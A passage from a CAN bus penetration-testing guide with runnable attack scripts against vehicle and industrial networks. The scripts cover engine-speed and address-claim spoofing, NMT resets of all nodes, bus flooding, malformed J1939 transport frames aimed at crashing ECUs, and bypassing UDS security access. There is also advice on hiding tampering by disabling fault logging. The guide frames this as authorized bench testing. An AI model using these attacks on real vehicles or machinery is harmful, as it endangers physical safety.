# Native J1939 socket - no external library needed
# Bring up J1939 capable interface
sudo ip link set can0 up type can bitrate 250000
sudo ip link set can0 promisc on

# Python using native j1939 socket
import socket, struct
sock = socket.socket(socket.PF_CAN, socket.SOCK_DGRAM, socket.CAN_J1939)
sock.bind(('can0', socket.J1939_NO_PGN, socket.J1939_NO_ADDR))
# Receive
data, addr = sock.recvfrom(1785)  # max J1939 TP payload
```

### 8.4 CANopen-Specific Tools

| Tool | Link | Description |
|---|---|---|
| **CANopenTerm** | https://github.com/CANopenTerm/CANopenTerm | CLI tool for SDO, NMT, monitoring |
| **CANopen-monitor** | https://github.com/oresat/CANopen-monitor | Python-based CANopen bus monitor |
| **CANopenNode** | https://github.com/CANopenNode/CANopenNode | Open source CANopen device stack (C) |
| **python-canopen** | https://github.com/christiansandberg/canopen | Python CANopen library (SDO, PDO, NMT) |
| **Wireshark** | Built-in | CANopen dissector included |

**python-canopen usage**:
```bash
pip3 install canopen

import canopen
network = canopen.Network()
network.connect(channel='can0', bustype='socketcan')

# Load EDS file (device description)
node = network.add_node(1, 'device.eds')

# Read from Object Dictionary
identity = node.sdo[0x1018][0x01].raw  # Vendor ID
device_type = node.sdo[0x1000].raw

# Write to Object Dictionary
node.sdo[0x6040].raw = 0x0006  # Controlword: Shutdown (for CiA 402 drives)

# Send NMT command - RESET ALL NODES (DoS)
network.send_message(0x000, [0x81, 0x00])  # Reset Application, Node 0 = all nodes
```

---

## 9. Lab Environment Setup (Step-by-Step)

### 9.1 Prerequisites

```bash
# Ubuntu/Debian
sudo apt-get update
sudo apt-get install -y \
    can-utils \
    python3-pip \
    python3-dev \
    git \
    wireshark \
    net-tools

# Python packages
pip3 install python-can cantools scapy canopen j1939

# Clone key tools
git clone https://github.com/CaringCaribou/caringcaribou.git
git clone https://github.com/collin80/SavvyCAN.git
git clone https://github.com/zombieCraig/ICSim.git
git clone https://github.com/CANopenTerm/CANopenTerm.git
git clone https://github.com/cantools/cantools.git
```

### 9.2 Virtual CAN Interface (No Hardware Needed)

```bash
# Load virtual CAN kernel module
sudo modprobe vcan

# Create virtual CAN interface
sudo ip link add dev vcan0 type vcan
sudo ip link set up vcan0

# Verify
ip link show vcan0
# Should show: vcan0: <NOARP,UP,LOWER_UP> ...

# Persistent setup (add to /etc/network/interfaces or systemd)
```

### 9.3 Physical Hardware Setup (PEAK PCAN-USB)

```bash
# Install PEAK Linux driver
# Download from: https://www.peak-system.com/fileadmin/media/linux/index.htm
tar -xjf peak-linux-driver.*.tar.bz2
cd peak-linux-driver.*
make NET=NETDEV_SUPPORT
sudo make install
sudo modprobe pcan

# Bring up interface
sudo ip link set can0 up type can bitrate 250000
candump can0  # test
```

### 9.4 Physical Hardware Setup (Kvaser)

```bash
# Download Kvaser LinuxCAN from: https://www.kvaser.com/downloads-kvaser/
tar -xzf kvaser-linuxcan*.tar.gz
cd kvaser-linuxcan*
make
sudo make install
sudo /sbin/start-kvaser.sh  # or load modules manually

# Create SocketCAN compatible interface
sudo kvaser_usb_hydra.ko  # module name varies by device
sudo ip link set can0 up type can bitrate 250000
```

### 9.5 Configure Caring Caribou

```bash
# ~/.canrc
[default]
interface = socketcan
channel = can0
bitrate = 250000

# Test
caringcaribou dump
```

### 9.6 Wireshark CAN Capture Setup

```bash
# Capture from SocketCAN to pcap
candump -l can0  # creates candump-DATE.log

# Convert to pcap for Wireshark
log2asc -I candump.log vcan0 > trace.asc  # or use can2pcap

# Directly capture in Wireshark
# Select interface: can0 or socketcan
# Filter: can.id == 0x18FEF004   (J1939 EEC1)
# Filter: canopen.nmt.command    (NMT messages)
```

---

## 10. Penetration Testing Methodology

### 10.1 Engagement Phases Overview

```
┌─────────────────────────────────────────────────────────┐
│  PHASE 0: Pre-Engagement                                │
│  • Written authorization                                │
│  • Define scope (which ECUs, which buses)               │
│  • Lab bench vs. live vehicle                           │
│  • Emergency stop procedure                             │
└────────────────────┬────────────────────────────────────┘
                     │
┌────────────────────▼────────────────────────────────────┐
│  PHASE 1: Reconnaissance & Passive Sniffing             │
│  • Traffic capture, message frequency analysis          │
│  • Protocol identification                              │
│  • Node enumeration                                     │
└────────────────────┬────────────────────────────────────┘
                     │
┌────────────────────▼────────────────────────────────────┐
│  PHASE 2: Active Scanning & Enumeration                 │
│  • UDS service discovery                                │
│  • J1939 PGN enumeration                                │
│  • CANopen node scan                                    │
│  • Address mapping                                      │
└────────────────────┬────────────────────────────────────┘
                     │
┌────────────────────▼────────────────────────────────────┐
│  PHASE 3: Vulnerability Assessment                      │
│  • Replay attack viability test                         │
│  • Authentication strength test                         │
│  • DTC and diagnostic access                            │
│  • Firmware version fingerprinting                      │
└────────────────────┬────────────────────────────────────┘
                     │
┌────────────────────▼────────────────────────────────────┐
│  PHASE 4: Exploitation                                  │
│  • Injection attacks                                    │
│  • DoS attacks                                          │
│  • Bus-Off attacks                                      │
│  • Diagnostic exploitation                              │
│  • Transport protocol attacks                           │
└────────────────────┬────────────────────────────────────┘
                     │
┌────────────────────▼────────────────────────────────────┐
│  PHASE 5: Post-Exploitation & Reporting                 │
│  • Impact assessment                                    │
│  • Persistence mechanisms                               │
│  • Evidence documentation                               │
│  • Remediation recommendations                          │
└─────────────────────────────────────────────────────────┘
```

---

## 11. Phase 1 — Reconnaissance & Passive Sniffing

### 11.1 Initial Bus Capture

```bash
# Capture with timestamps (nanosecond precision)
candump -t a -l can0
# Creates: candump-2025-01-01_120000.log

# Monitor with color coding
candump -c -t a can0

# Statistics — detect dominant message IDs
candump can0 | awk '{print $3}' | cut -d# -f1 | sort | uniq -c | sort -rn | head -20
```

### 11.2 Traffic Analysis Checklist

- [ ] **Message frequency**: Which IDs appear at what rate? (cyclic messages indicate sensor data)
- [ ] **Sporadic messages**: Which IDs appear rarely? (likely command/response pairs)
- [ ] **Bus load**: Calculate total frame rate vs theoretical maximum
- [ ] **Identifier space**: 11-bit (CANopen, OBD) vs 29-bit (J1939)?
- [ ] **Baud rate verification**: Try 125K, 250K, 500K, 1M
- [ ] **CAN FD detection**: Look for EDL bit in frame (requires FD-capable hardware/software)
- [ ] **Message length patterns**: Fixed-8 vs variable = J1939 TP active?

### 11.3 Automated Protocol Detection

```python
#!/usr/bin/env python3
# Protocol fingerprinting script
import can
from collections import Counter

bus = can.interface.Bus(channel='can0', bustype='socketcan')
id_counter = Counter()
extended_count = 0
standard_count = 0

print("Capturing 1000 frames...")
for i, msg in enumerate(bus):
    if i >= 1000:
        break
    id_counter[msg.arbitration_id] += 1
    if msg.is_extended_id:
        extended_count += 1
    else:
        standard_count += 1

print(f"\nExtended IDs: {extended_count} ({extended_count/10:.1f}%)")
print(f"Standard IDs: {standard_count} ({standard_count/10:.1f}%)")

if extended_count > standard_count:
    print("→ Likely J1939 or J1939-based protocol (29-bit IDs dominant)")
else:
    print("→ Likely CANopen or CAN 2.0A protocol (11-bit IDs dominant)")

print("\nTop 10 most frequent IDs:")
for arb_id, count in id_counter.most_common(10):
    print(f"  0x{arb_id:08X}: {count} frames")
```

### 11.4 J1939 Source Address Mapping

```python
#!/usr/bin/env python3
# Map all J1939 source addresses present on the bus
import can
from collections import defaultdict

bus = can.interface.Bus(channel='can0', bustype='socketcan')
node_map = defaultdict(set)

for i, msg in enumerate(bus):
    if i >= 5000:
        break
    if msg.is_extended_id:
        sa = msg.arbitration_id & 0xFF           # Source Address (low 8 bits)
        pgn_raw = (msg.arbitration_id >> 8) & 0x3FFFF
        pf = (pgn_raw >> 8) & 0xFF
        if pf >= 240:
            pgn = pgn_raw
        else:
            pgn = pgn_raw & 0x3FF00
        node_map[sa].add(pgn)

print("\nJ1939 Source Address Map:")
print(f"{'SA':<8} {'Addr (hex)':<12} {'PGNs Seen'}")
print("-" * 50)
for sa in sorted(node_map.keys()):
    pgn_list = sorted(node_map[sa])
    print(f"{sa:<8} 0x{sa:02X}{'':10} {[hex(p) for p in pgn_list[:5]]}")
```

---

## 12. Phase 2 — Active Scanning & Enumeration

### 12.1 UDS ECU Discovery (CaringCaribou)

```bash
# Scan for ECUs responding to UDS diagnostic session request
# Tries arbitration IDs 0x000 to 0x7FF
caringcaribou uds discovery

# Extended range scan
caringcaribou uds discovery -min 0x700 -max 0x7FF

# J1939 specific - scan PDU1 range
caringcaribou uds discovery -min 0x18DA0000 -max 0x18DAFFFF
```

### 12.2 UDS Service Discovery

```bash
# After finding an ECU at 0x7E0 (request) / 0x7E8 (response)
caringcaribou uds services 0x7E0 0x7E8

# Example output:
# Found service 0x10 (DiagnosticSessionControl)
# Found service 0x11 (ECUReset)  
# Found service 0x14 (ClearDiagnosticInformation)
# Found service 0x19 (ReadDTCInformation)
# Found service 0x22 (ReadDataByIdentifier)
# Found service 0x27 (SecurityAccess)
# Found service 0x2E (WriteDataByIdentifier)
# Found service 0x31 (RoutineControl)
# Found service 0x34 (RequestDownload)
# Found service 0x36 (TransferData)
# Found service 0x85 (ControlDTCSetting)
```

### 12.3 J1939 PGN Request Sweep

```python
#!/usr/bin/env python3
# Sweep all standard J1939 PGNs with Request PGN (0xEA00)
import can, time

bus = can.interface.Bus(channel='can0', bustype='socketcan')

# Common J1939 PGNs to probe
pgns_to_probe = [
    0xF004, 0xFEF1, 0xFEF0, 0xFEF5, 0xFECA, 0xFECB,
    0xFEC1, 0xFEEC, 0xFF00, 0xFF01, 0xFEDA, 0xFEDB,
    0xFEDE, 0xFEDF, 0xFEE0, 0xFEE1, 0xFEE5, 0xFEE6,
]

GLOBAL_ADDR = 0xFF  # broadcast destination
REQUEST_PGN = 0xEA  # PF for Request PGN

for pgn in pgns_to_probe:
    pgn_bytes = pgn.to_bytes(3, 'little')
    # Construct Request message
    # Priority=6, DP=0, PF=0xEA, PS=0xFF (global), SA=0xF9 (test tool)
    arb_id = (6 << 26) | (0x00EA << 8) | (GLOBAL_ADDR << 8) | 0xF9
    # Actually EA is the PF, destination FF is PS:
    arb_id = (6 << 26) | (0xEA << 16) | (GLOBAL_ADDR << 8) | 0xF9
    
    msg = can.Message(
        arbitration_id=arb_id,
        data=list(pgn_bytes) + [0xFF, 0xFF, 0xFF, 0xFF, 0xFF],
        is_extended_id=True
    )
    bus.send(msg)
    
    # Listen for 200ms
    bus.set_filters([])
    deadline = time.time() + 0.2
    while time.time() < deadline:
        resp = bus.recv(timeout=0.05)
        if resp:
            resp_pf = (resp.arbitration_id >> 16) & 0xFF
            resp_pgn_raw = (resp.arbitration_id >> 8) & 0x3FFFF
            print(f"PGN 0x{pgn:04X} → Response: ID=0x{resp.arbitration_id:08X} Data={resp.data.hex()}")
    
    time.sleep(0.05)  # rate limit
```

### 12.4 CANopen Node Scan

```python
#!/usr/bin/env python3
# Scan for all CANopen nodes on the bus via NMT heartbeat / SDO identity
import canopen

network = canopen.Network()
network.connect(channel='can0', bustype='socketcan', bitrate=250000)

print("Scanning for CANopen nodes (listening for heartbeats 5s)...")
network.scanner.search(limit=5)

import time
time.sleep(5)

print(f"\nFound {len(network.scanner.nodes)} nodes: {network.scanner.nodes}")

for node_id in network.scanner.nodes:
    try:
        node = network.add_node(node_id)
        vendor_id = node.sdo[0x1018][0x01].raw
        product_code = node.sdo[0x1018][0x02].raw
        device_type = node.sdo[0x1000].raw
        print(f"Node {node_id:3d}: VendorID=0x{vendor_id:08X}  "
              f"Product=0x{product_code:08X}  DevType=0x{device_type:08X}")
    except Exception as e:
        print(f"Node {node_id:3d}: SDO error — {e}")

network.disconnect()
```

---

## 13. Phase 3 — Vulnerability Assessment

### 13.1 Test Case: Authentication Strength (UDS Security Access)

**Test TC-AUTH-001**: Security Access Seed Analysis

```bash
# Collect 100 security access seeds for randomness analysis
caringcaribou fuzzer seed_randomness_fuzzer 0x7E0 0x7E8 0x01 -n 100

# Manual seed collection
caringcaribou uds security_seed 0x7E0 0x7E8 0x01
```

**What to look for**:
- Seeds that are sequential (poor PRNG)
- Seeds that are time-based (predictable with timestamp sync)
- Constant seeds (no randomness at all)
- Key = simple XOR or arithmetic operation on seed

### 13.2 Test Case: Replay Attack Viability

```bash
# Step 1: Capture a specific command sequence
candump -l can0
# Perform the target action (e.g., unlock door, activate system)
# Stop capture

# Step 2: Extract frames of interest
grep "18FF0001" candump-2025-01-01_120000.log > replay_frames.log

# Step 3: Replay captured sequence
canplayer -I replay_frames.log -l 1 can0

# Step 4: Observe if action repeats
# If yes → No replay protection (missing sequence numbers, timestamps, or MACs)
```

### 13.3 Test Case: DTC and Diagnostic Data Extraction

```bash
# Read all active DTCs (J1939 DM1)
# DM1 is broadcast; just capture PGN 0xFECA
candump can0 | grep -i "FECA"

# Request DM2 (previously active DTCs)
cansend can0 18EAFFF9#CBFE00FFFFFFFF  # Request PGN 0xFECB

# UDS DTC read
caringcaribou uds dtc 0x7E0 0x7E8

# Dump all readable DIDs (Data Identifiers)
caringcaribou uds dump_dids 0x7E0 0x7E8

# Manually read a specific DID (e.g., VIN = 0xF190)
# UDS ReadDataByIdentifier (SID 0x22)
python3 -c "
import can
bus = can.interface.Bus(channel='can0', bustype='socketcan')
# DiagnosticSessionControl - switch to default session first
bus.send(can.Message(arbitration_id=0x7E0, data=[0x02, 0x10, 0x01, 0xCC,0xCC,0xCC,0xCC,0xCC], is_extended_id=False))
import time; time.sleep(0.1)
# ReadDataByIdentifier - VIN
bus.send(can.Message(arbitration_id=0x7E0, data=[0x03, 0x22, 0xF1, 0x90, 0xCC,0xCC,0xCC,0xCC], is_extended_id=False))
for msg in bus:
    if msg.arbitration_id == 0x7E8:
        print('Response:', msg.data.hex())
        break
"
```

### 13.4 Test Case: Firmware Version Fingerprinting

```bash
# Read ECU identification (DID 0xF181 = applicationSoftwareFingerprint)
# DID 0xF180 = bootSoftwareFingerprint
# DID 0xF18A = systemNameOrEngineType
# DID 0xF18C = ECU Serial Number
# DID 0xF190 = VIN
# DID 0xF197 = System Supplier ECU Hardware Number
# DID 0xF1A0 = Boot Software Identification

caringcaribou uds dump_dids 0x7E0 0x7E8 -df 0xF180 -dt 0xF1FF
```

---

## 14. Phase 4 — Exploitation Techniques

### 14.1 Frame Injection Attack

**Concept**: Since CAN has no authentication, any node can send any frame. An attacker connected to the bus can inject frames with safety-critical IDs.

```python
#!/usr/bin/env python3
# J1939 Engine Speed Spoofing (educational demonstration only)
# ONLY use on isolated test bench with written authorization
import can, time

bus = can.interface.Bus(channel='can0', bustype='socketcan')

# Spoof EEC1 (Engine Electronic Controller 1) — PGN 0xF004
# Priority=3, DP=0, PF=0xF0, PS=0x04, SA=0x00 (Engine Controller)
arb_id = (3 << 26) | (0xF004 << 8) | 0x00

# Data: set engine speed to 2000 RPM (0x3E80 × 0.125 = 2000)
# SPN 190 = bytes 4-5, little endian, 0.125 RPM/bit
rpm = 2000
rpm_raw = int(rpm / 0.125)  # = 16000 = 0x3E80
data = [0xFF, 0xFF, 0xFF, rpm_raw & 0xFF, (rpm_raw >> 8) & 0xFF, 0xFF, 0xFF, 0xFF]

print(f"Injecting spoofed engine speed: {rpm} RPM")
for _ in range(10):
    msg = can.Message(arbitration_id=arb_id, data=data, is_extended_id=True)
    bus.send(msg)
    time.sleep(0.05)  # 20Hz injection rate
```

### 14.2 Bus-Off Attack (ECU Denial of Service)

**Concept**: By deliberately causing bit errors at the right moment, an attacker can force a target ECU into the "Bus-Off" state, silencing it completely.

This is implemented in the `canhack` library by @kentindell:
```bash
git clone https://github.com/kentindell/canhack
# Requires custom hardware (Arduino/STM32 with CAN transceiver)
# canhack can inject a single dominant bit at precise timing
# Repeated 16 times → error counter reaches 255 → Bus-Off
```

**Detection**: Target ECU stops transmitting. Other ECUs may generate DTC for missing message.

### 14.3 Denial of Service — Bus Flooding

```bash
# Flood bus with highest-priority frames (ID=0x000)
# This can starve lower-priority messages
cangen can0 -I 0x000 -L 8 -D 0000000000000000 -g 0 -n 10000

# J1939 bus flooding
cangen can0 -I 0x00000000 -e -L 8 -D i -g 0 -n 10000
```

**Effect**: Bus utilization reaches 100%; legitimate messages experience significant delay or are dropped. In safety-critical systems this can cause missed deadlines.

### 14.4 J1939 Address Claim Spoofing

```python
#!/usr/bin/env python3
# Spoof J1939 address claim to take over an existing ECU's address
# This can cause the legitimate ECU to lose its address
import can, time

bus = can.interface.Bus(channel='can0', bustype='socketcan')

# Craft a high-priority (low NAME value) address claim
# NAME: 64-bit, lower value = higher priority in claim contest
# NAME fields: Identity Number(21) | Mfr Code(11) | ECU Instance(3) | 
#               Function Instance(5) | Function(8) | Reserved(1) | 
#               Vehicle System(7) | Vehicle System Instance(4) | 
#               Industry Group(3) | Arbitrary Address(1)

target_address = 0x00  # Try to claim Engine Controller's address

# Use minimum NAME to guarantee priority win
name_bytes = [0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x80]
# Bit 63 (MSB of last byte) = Arbitrary Address Capable = 1

# PGN 0xEE00 = Address Claimed, SA = target_address
arb_id = (6 << 26) | (0xEE << 16) | (0xFF << 8) | target_address

msg = can.Message(arbitration_id=arb_id, data=name_bytes, is_extended_id=True)
bus.send(msg)
print(f"Sent address claim for SA=0x{target_address:02X}")

# Wait 250ms — if no contention, address is ours
time.sleep(0.25)
# Listen for competing claims
# If legitimate ECU has a lower NAME, it will send another claim and win
```

### 14.5 CANopen NMT Reset Attack

```python
#!/usr/bin/env python3
# Send NMT Reset Application to ALL nodes
# This causes every CANopen node to reset
import can

bus = can.interface.Bus(channel='can0', bustype='socketcan')

# NMT COB-ID = 0x000
# Command: 0x81 = Reset Application
# Node ID: 0x00 = all nodes
msg = can.Message(
    arbitration_id=0x000,
    data=[0x81, 0x00],
    is_extended_id=False
)
bus.send(msg)
print("Sent NMT Reset Application to ALL nodes — network will restart")
```

```python
# Stop a specific node (e.g., motor drive at Node 5)
msg = can.Message(
    arbitration_id=0x000,
    data=[0x02, 0x05],  # Stop Node, Node-ID=5
    is_extended_id=False
)
bus.send(msg)
print("Sent NMT Stop to Node 5 — motor drive will enter STOPPED state")
```

### 14.6 J1939 Transport Protocol Buffer Overflow

**Concept**: Malformed TP.CM_RTS/BAM messages with inconsistent length fields can cause heap/stack overflows in vulnerable ECU firmware.

```python
#!/usr/bin/env python3
# Send malformed J1939 BAM with incorrect length
import can, time

bus = can.interface.Bus(channel='can0', bustype='socketcan')

# BAM frame: PGN 0xEC00, SA=0xF9
# CM byte=0x20 (BAM), message_length mismatched with num_packets
# Claim to send 65535 bytes in 1 packet = buffer overflow attempt
arb_id = (7 << 26) | (0xEC << 16) | (0xFF << 8) | 0xF9

# BAM: [CM_BAM=0x20, msg_len_lo, msg_len_hi, num_packets, 0xFF, PGN_lo, PGN_mid, PGN_hi]
bam_data = [
    0x20,         # CM_BAM
    0xFF, 0xFF,   # message_length = 65535 bytes (malformed — way too large)
    0x01,         # num_packets = 1 (inconsistent)
    0xFF,         # reserved
    0x00, 0xFE, 0x00  # Target PGN = 0x00FE00 (arbitrary)
]

msg = can.Message(arbitration_id=arb_id, data=bam_data, is_extended_id=True)
bus.send(msg)
print("Sent malformed BAM — monitor target ECU for crash/reboot")
time.sleep(0.1)

# Send one DT frame (even though we claimed 65535 bytes)
dt_arb_id = (7 << 26) | (0xEB << 16) | (0xFF << 8) | 0xF9
dt_data = [0x01, 0xAA, 0xBB, 0xCC, 0xDD, 0xEE, 0xFF, 0x00]
dt_msg = can.Message(arbitration_id=dt_arb_id, data=dt_data, is_extended_id=True)
bus.send(dt_msg)
```

### 14.7 UDS Firmware Download (If Security Access Bypassed)

```bash
# UDS service 0x34 = RequestDownload
# UDS service 0x36 = TransferData  
# UDS service 0x37 = RequestTransferExit

# This requires bypassing Security Access (0x27) first
# If seed algorithm is weak or known, key can be calculated

# Using Scapy for UDS over ISO-TP
python3 << 'EOF'
from scapy.all import *
from scapy.contrib.automotive.isotp import *
from scapy.contrib.automotive.uds import *

sock = ISOTPSocket('can0', tx_id=0x7E0, rx_id=0x7E8, padding=True)

# Step 1: Extended Diagnostic Session
resp = sock.sr1(UDS()/UDS_DSC(diagnosticSessionType='programmingSession'), timeout=2)
print("DSC:", resp.summary() if resp else "No response")

# Step 2: Security Access - Request Seed
resp = sock.sr1(UDS()/UDS_SA(accessType=0x01), timeout=2)
if resp:
    seed = bytes(resp)[2:6]
    print(f"Seed: {seed.hex()}")
    # Calculate key based on known algorithm
    # key = seed XOR 0x12345678 (example - real algorithms vary)
    key = bytes([s ^ k for s, k in zip(seed, [0x12, 0x34, 0x56, 0x78])])
    
    # Step 3: Security Access - Send Key
    resp = sock.sr1(UDS()/UDS_SA(accessType=0x02, securityAccessDataRecord=key), timeout=2)
    print("Key response:", resp.summary() if resp else "Failed")
EOF
```

---

## 15. Phase 5 — Post-Exploitation

### 15.1 Persistence via Diagnostic Services

Once ECU access is achieved via UDS:
- **Write to NV memory** using `WriteDataByIdentifier (0x2E)` — store malicious config
- **Modify routine control parameters** via `RoutineControl (0x31)` — alter ECU behavior
- **Flash modified firmware** via download services if security access is bypassed
- **Disable DTC monitoring** via `ControlDTCSetting (0x85)` to hide anomalous behavior

### 15.2 Evidence Capture

```bash
# Capture all traffic during engagement
candump -t a -l can0 &
CANDUMP_PID=$!

# ... perform tests ...

kill $CANDUMP_PID
# Compress log
gzip candump-*.log

# Generate bus statistics report
canlogserver can0 > bus_stats.txt

# Convert to pcap for Wireshark analysis
# Install: pip3 install can2pcap  (or use wireshark's canlog2wireshark)
```

---

## 16. Protocol-Specific Test Cases — J1939

### Test Suite: J1939-SEC

| ID | Test Case | Method | Pass Criteria | Risk |
|---|---|---|---|---|
| J1939-001 | **Address Claim Spoofing** | Inject higher-priority NAME for target SA | Legitimate ECU loses address | High |
| J1939-002 | **PGN Injection - Engine Speed** | Inject EEC1 (PGN F004) with false RPM | Gauge/cluster reflects injected value | High |
| J1939-003 | **PGN Injection - Brake** | Inject EBC1 (PGN FEF0) | Brake-related actuator responds | Critical |
| J1939-004 | **DM1 Fault Code Injection** | Inject PGN FECA with fake DTCs | False fault codes appear | Medium |
| J1939-005 | **DTC Erase** | Request DM11 (PGN FEEC) | Fault history cleared | Medium |
| J1939-006 | **Replay Attack** | Capture + replay safety message | System responds to old command | High |
| J1939-007 | **TP BAM Malformed Length** | BAM with length/packet count mismatch | Target ECU crashes or reboots | High |
| J1939-008 | **TP Session Confusion** | Interleave BAM sessions from different SAs | ECU state corruption | Medium |
| J1939-009 | **Bus Flooding DoS** | Max-rate frame injection | Legitimate message latency > 100ms | High |
| J1939-010 | **Request PGN Sweep** | Send Request (0xEA00) for all PGNs | Map all supported PGNs | Low |
| J1939-011 | **Proprietary PGN Discovery** | Probe 0xFF00-0xFFFF range | Discover OEM-specific messages | Low |
| J1939-012 | **Source Address Impersonation** | Use SA=0x00 (engine controller) | Messages accepted as from engine | High |
| J1939-013 | **Transport Protocol Session Hijack** | Inject DT frame into open TP session | Session data corruption | Medium |
| J1939-014 | **Commanded Address Attack** | Send Commanded Address (PGN 0xFED8) | Force SA change on target ECU | High |
| J1939-015 | **J1939 over CAN FD Boundary** | Send CAN FD frame on Classic CAN network | Gateway crash or undefined behavior | High |

---

## 17. Protocol-Specific Test Cases — CANopen

### Test Suite: CANOPEN-SEC

| ID | Test Case | Method | Pass Criteria | Risk |
|---|---|---|---|---|
| CO-001 | **NMT Reset All Nodes** | Send 0x000 [0x81, 0x00] | All nodes reset | Critical |
| CO-002 | **NMT Stop Specific Node** | Send 0x000 [0x02, NODE_ID] | Target node enters STOPPED | High |
| CO-003 | **NMT Enter Pre-Operational** | Send 0x000 [0x80, NODE_ID] | Node disables PDO comms | High |
| CO-004 | **SDO Read Object Dictionary** | Read 0x1018 sub-indexes | Obtain device identity info | Low |
| CO-005 | **SDO Write Critical Parameters** | Write 0x6040 controlword | Actuator state changes | Critical |
| CO-006 | **SDO Read All Indexes** | Sweep 0x1000–0x9FFF | Map all OD entries | Low |
| CO-007 | **RPDO Injection** | Send frame on RPDO COB-ID | Node processes as valid PDO | High |
| CO-008 | **Heartbeat Suppression** | Flood bus; suppress heartbeat | NMT master declares node failed | Medium |
| CO-009 | **SYNC Injection** | Inject extra SYNC (0x080) | Synchronous PDOs trigger early | Medium |
| CO-010 | **Emergency Frame Injection** | Send EMCY on target's COB-ID | False emergency logged | Medium |
| CO-011 | **SDO Block Download** | Write large block to sensitive index | Buffer overflow / firmware mod | High |
| CO-012 | **COB-ID Conflict Attack** | Use same COB-ID as existing node | Bus arbitration confusion | Medium |
| CO-013 | **Node Guarding Manipulation** | Spoof node guard response | NMT master believes node is alive | Medium |
| CO-014 | **PDO Configuration Attack** | Modify RPDO mapping via SDO | Reroute safety-critical signals | High |
| CO-015 | **TIME Message Injection** | Inject TIME object (COB-ID 0x100) | Timestamping corruption | Low |

---

## 18. Protocol-Specific Test Cases — CAN FD

### Test Suite: CANFD-SEC

| ID | Test Case | Method | Pass Criteria | Risk |
|---|---|---|---|---|
| FD-001 | **CAN FD Frame Injection** | Send FD frame with EDL+BRS bits | Target processes FD payload | High |
| FD-002 | **Large Payload Injection** | Inject 64-byte malicious payload | Buffer handling in ECU tested | High |
| FD-003 | **Baud Rate Mismatch Attack** | Inject with wrong data phase baud | Bit error cascade on bus | Medium |
| FD-004 | **Classic-to-FD Gateway Bypass** | Craft FD frame that looks valid to gateway but malicious to FD ECU | Security domain crossing | High |
| FD-005 | **CAN FD DLC Confusion** | Send DLC=9 (meaning 12 bytes) mismatched with actual data | ECU length miscalculation | High |
| FD-006 | **ESI Bit Manipulation** | Inject frame with ESI=1 (error passive indicator) | False error state perception | Low |
| FD-007 | **CAN FD vs Classic Priority Confusion** | Exploit mixed-mode network during arbitration | Bus access violation | Medium |
| FD-008 | **J1939-FD Boundary Test** | Probe J1939-22 (FEFF) extended PGN space | Discover FD-specific messages | Low |
| FD-009 | **CAN FD Replay Attack** | Replay captured FD frames | No freshness protection | High |
| FD-010 | **CAN FD Fuzzing** | Random 64-byte payloads | ECU crash or undefined behavior | High |

---

## 19. Fuzzing Strategies

### 19.1 Dumb Fuzzing (Random)

```bash
# Generate random frames on vcan0
cangen vcan0 -I r -L r -D r -g 1 -n 100000

# Target specific arbitration ID with random data
cangen vcan0 -I 0x7E0 -L 8 -D r -g 5 -n 10000

# J1939 extended ID fuzzing
cangen vcan0 -I r -e -L 8 -D r -g 1 -n 100000
```

### 19.2 Smart Fuzzing (Protocol-Aware)

```python
#!/usr/bin/env python3
# Protocol-aware J1939 TP fuzzer
import can, random, time, struct

bus = can.interface.Bus(channel='can0', bustype='socketcan')

def fuzz_j1939_bam():
    """Fuzz J1939 BAM fields"""
    sa = random.randint(0, 0xFD)
    arb_id = (7 << 26) | (0xEC << 16) | (0xFF << 8) | sa
    
    msg_len = random.randint(0, 0xFFFF)      # fuzz message length
    num_pkts = random.randint(0, 0xFF)        # fuzz packet count
    target_pgn = random.randint(0, 0x3FFFF)  # fuzz target PGN
    
    bam = [
        0x20,                               # BAM indicator
        msg_len & 0xFF,                     # length low
        (msg_len >> 8) & 0xFF,              # length high
        num_pkts,                           # number of packets
        0xFF,                               # reserved
        target_pgn & 0xFF,                  # PGN low
        (target_pgn >> 8) & 0xFF,           # PGN mid
        (target_pgn >> 16) & 0xFF,          # PGN high
    ]
    
    msg = can.Message(arbitration_id=arb_id, data=bam, is_extended_id=True)
    try:
        bus.send(msg)
        return True
    except:
        return False

def fuzz_uds_services(tx_id=0x7E0):
    """Fuzz UDS service bytes"""
    # Random service ID with random data
    svc = random.randint(0x00, 0xFF)
    payload_len = random.randint(1, 7)
    data = [payload_len] + [svc] + [random.randint(0, 0xFF) for _ in range(payload_len-1)]
    data += [0xCC] * (8 - len(data))
    
    msg = can.Message(arbitration_id=tx_id, data=data, is_extended_id=False)
    try:
        bus.send(msg)
        return True
    except:
        return False

print("Starting J1939 TP fuzzing... monitor target ECU for anomalies")
for i in range(1000):
    fuzz_j1939_bam()
    if i % 100 == 0:
        print(f"  {i}/1000 frames sent")
    time.sleep(0.01)
```

### 19.3 UDS Fuzzer (CaringCaribou)

```bash
# Seed randomness fuzzer — test PRNG quality
caringcaribou fuzzer seed_randomness_fuzzer 0x7E0 0x7E8 0x01 -n 1000

# Delay fuzzer — test time-based seed prediction
caringcaribou fuzzer delay_fuzzer 0x7E0 0x7E8 0x01
```

### 19.4 Boofuzz for CAN (Advanced)

```python
# Using boofuzz for structured protocol fuzzing
pip3 install boofuzz

from boofuzz import *

# Example: CANopen SDO read fuzzer
s_initialize("sdo_read")
s_static(b'\x40')           # Command specifier: upload request
s_word(0x1000, endian='<', name='index', fuzzable=True)   # Object index
s_byte(0x00, name='subindex', fuzzable=True)               # Sub-index
s_static(b'\x00\x00\x00\x00')  # Reserved bytes
```

---

## 20. Reporting & Documentation

### 20.1 Finding Classification

Use a severity matrix combining **Likelihood × Impact**:

| Severity | CVSS Score | Example Findings |
|---|---|---|
| **Critical** | 9.0–10.0 | Unauthenticated brake injection, ECU firmware flash without auth |
| **High** | 7.0–8.9 | Bus-Off DoS on safety ECU, address claim spoofing of safety node |
| **Medium** | 4.0–6.9 | DTC erasure, DID read of sensitive data, replay attacks |
| **Low** | 0.1–3.9 | Node enumeration, PGN mapping, non-sensitive data exposure |
| **Informational** | N/A | Architecture observations, missing hardening best practices |

### 20.2 Finding Template

```markdown
## Finding: [FINDING-ID] — [Short Title]

**Severity**: Critical / High / Medium / Low / Informational  
**Protocol**: J1939 / CANopen / CAN FD / Classic CAN  
**CVSS v3.1**: [Score] ([Vector String])

### Description
[Detailed description of the vulnerability]

### Attack Vector
[How the attack is carried out — physical/adjacent/network access required]

### Reproduction Steps
1. Connect CAN interface to [port/connector]
2. Configure interface: `sudo ip link set can0 up type can bitrate 250000`
3. Execute: `[command/script]`
4. Observe: [what happens]

### Evidence
```
[Captured frames / screenshots / log output]
```

### Impact
